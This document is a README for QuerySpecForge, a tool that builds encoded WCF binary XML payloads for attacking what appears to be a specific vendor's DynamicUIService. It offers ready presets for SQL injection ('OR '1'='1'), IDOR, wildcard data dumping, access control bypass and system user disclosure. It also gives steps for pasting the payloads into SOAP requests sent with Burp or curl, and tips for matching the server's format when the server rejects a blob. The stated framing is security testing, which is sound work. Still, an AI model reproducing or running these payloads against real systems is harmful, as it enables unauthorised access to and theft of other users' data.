# QuerySpecForge

WCF Binary XML payload builder for SCToolkit2 DynamicUIService security testing.

## Requirements

- .NET 6.0 SDK or later (`dotnet --version` to check)
- Download: https://dotnet.microsoft.com/download

## Quick Start

```bash
cd QuerySpecForge

# Build
dotnet build

# Generate a normal request blob
dotnet run -- encode normal

# Generate SQL injection payload
dotnet run -- encode sqli

# Generate IDOR payload
dotnet run -- encode idor

# Decode an existing blob (from captured traffic)
dotnet run -- decodefile captured_blob.txt

# Decode inline
dotnet run -- decode "eJylkltLwz..."
```

## Presets

| Preset    | What it does |
|-----------|-------------|
| `normal`  | Normal request: `case_code = 143560` |
| `sqli`    | SQL injection: `143560' OR '1'='1` in value |
| `idor`    | IDOR: `Negated=true` returns other users' data |
| `wildcard`| Dump all: `OP_LIKE` with `%` wildcard |
| `override`| Access control bypass: `OverrideDataSourceCode=1` |
| `columns` | Info disclosure: `system_user` in ExportColumns |
| `custom`  | Your payload: edit `BuildCustom()` in Program.cs |

## How to Use the Output

1. Run `dotnet run -- encode sqli`
2. Copy the base64 blob from the output
3. Paste it into your SOAP request:

```xml
<soap:Body>
  <LoadData xmlns="http://qualco.gr/">
    <environment>uat2</environment>
    <uiId>3076</uiId>
    <tableName>test</tableName>
    <querySpec>PASTE_BASE64_HERE</querySpec>
  </LoadData>
</soap:Body>
```

4. Send with Burp/Fiddler/curl

## Custom Payloads

Edit the `BuildCustom()` method in `Program.cs`:

```csharp
static QuerySpec BuildCustom()
{
    var qs = new QuerySpec
    {
        UseParametrizeSQL = false,
        OverrideDataSourceCode = 42,  // Pick any datasource
        ExportColumns = "system_user,current_user",
    };

    qs._Criteria["emp_code"] = new QuerySpec.FieldCriteria
    {
        FieldName = "emp.emp_code",
        SqlOperator = new QuerySpec.SqlOperatorSpec
        {
            SqlOperator = "OP_EQ",
            Negated = false,
        },
        Value = "12731' OR '1'='1"  // SQLi payload
    };

    // @-prefixed SQL template parameters
    qs._SQLParameters._Parameters["@emp_code"] = 12731;
    qs._SQLParameters._Parameters["@lawy_code"] = 0;

    return qs;
}
```

## Decoding Captured Blobs

Save the base64 from a captured request to a file, then:

```bash
dotnet run -- decodefile captured.txt
```

This will:
1. Base64 decode
2. Zlib decompress
3. Convert binary XML to readable text XML
4. Try to deserialize into a QuerySpec object and print all fields

## Troubleshooting

**"Expected end of stream not found"** - The class structure doesn't exactly
match the server's. Decode a real captured blob first (`decodefile`) to see
the exact XML structure, then adjust `QuerySpecTypes.cs` to match.

**Deserialization fails but XML decodes fine** - The readable XML output is
still useful. Compare it with your model classes and fix mismatches (property
names, namespaces, types).

**Server rejects the blob** - Capture a working request, decode it, and
compare the XML structure side-by-side with what this tool produces.
Match element names, namespaces, and ordering exactly.
